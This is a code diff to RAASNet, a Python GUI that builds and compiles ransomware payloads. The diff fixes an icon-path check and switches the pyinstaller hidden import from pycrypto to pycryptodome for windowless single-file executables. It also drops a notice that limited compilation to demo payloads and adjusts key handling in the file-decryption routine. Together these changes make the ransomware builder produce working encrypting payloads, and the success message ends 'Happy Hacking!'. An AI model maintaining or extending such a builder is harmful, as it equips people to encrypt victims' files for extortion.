@@ -5,9 +5,6 @@ Welcome to RAASNet v0.1
 To use all features of this software, please do:
 pip3 install -r requirements.txt
 
-Compile this software with:
-pyinstaller RAASNet.spec
-
 '''
 import os, sys, subprocess, threading, time, datetime, socket, select, PIL.Image, PIL.ImageTk, webbrowser, base64, platform
 from tkinter import *
@@ -273,18 +270,12 @@ class MainWindow(Tk):
         icon = False
 
         if not self.options['icon_path'].get() == '':
-            if not os.path.isfile(self.options['icon_path'].get() == ''):
+            if not os.path.isfile(self.options['icon_path'].get()):
                 return messagebox.showwarning('ERROR', 'Icon File Not Found!')
             else:
                 icon = True
         if not os.path.isfile(self.options['payload_path'].get()):
             return messagebox.showwarning('ERROR', 'Payload Not Found!')
-
-        q = messagebox.askokcancel('Notice','Current version only supports compiling without pycrypto, which means it only works if you generated the payload with demo enabled\n\nClick OK to continue, cancel to cancel.')
-        if q == True:
-            pass
-        else:
-            return
 
         try:
             if self.options['os'].get() == 'windows':
@@ -293,11 +284,11 @@ class MainWindow(Tk):
                 py = 'pyinstaller'
 
             if icon == True:
-                #os.system("%s -F -w -i %s --hidden-import tkinter --hidden-import tkinter.ttk --hidden-import ttkthemes --hidden-import pycrypto %s" % (py, self.options['icon_path'].get(), self.options['payload_path'].get()))
-                os.system("%s -F -w -i %s --hidden-import tkinter --hidden-import tkinter.ttk --hidden-import ttkthemes %s" % (py, self.options['icon_path'].get(), self.options['payload_path'].get()))
+                #os.system("%s -F -w -i %s --hidden-import tkinter --hidden-import tkinter.ttk --hidden-import pycrypto %s" % (py, self.options['icon_path'].get(), self.options['payload_path'].get()))
+                os.system("%s -F -w -i %s --hidden-import tkinter --hidden-import tkinter.ttk --hidden-import pycryptodome %s" % (py, self.options['icon_path'].get(), self.options['payload_path'].get()))
             else:
-                #os.system("%s -F -w --hidden-import tkinter --hidden-import tkinter.ttk --hidden-import ttkthemes --hidden-import pycrypto %s" % (py, self.options['payload_path'].get()))
-                os.system("%s -F -w --hidden-import tkinter --hidden-import tkinter.ttk --hidden-import ttkthemes %s" % (py, self.options['payload_path'].get()))
+                #os.system("%s -F -w --hidden-import tkinter --hidden-import tkinter.ttk --hidden-import pycrypto %s" % (py, self.options['payload_path'].get()))
+                os.system("%s -F -w --hidden-import tkinter --hidden-import tkinter.ttk --hidden-import pycryptodome %s" % (py, self.options['payload_path'].get()))
 
             messagebox.showinfo('SUCCESS', 'Compiled successfully!\nFile located in: dist/\n\nHappy Hacking!')
             self.comp.destroy()
@@ -358,6 +349,7 @@ class MainWindow(Tk):
 
     def decrypt_files(self):
         key = dec_key()
+        key = key.encode('utf-8')
         if key == False:
             return
 
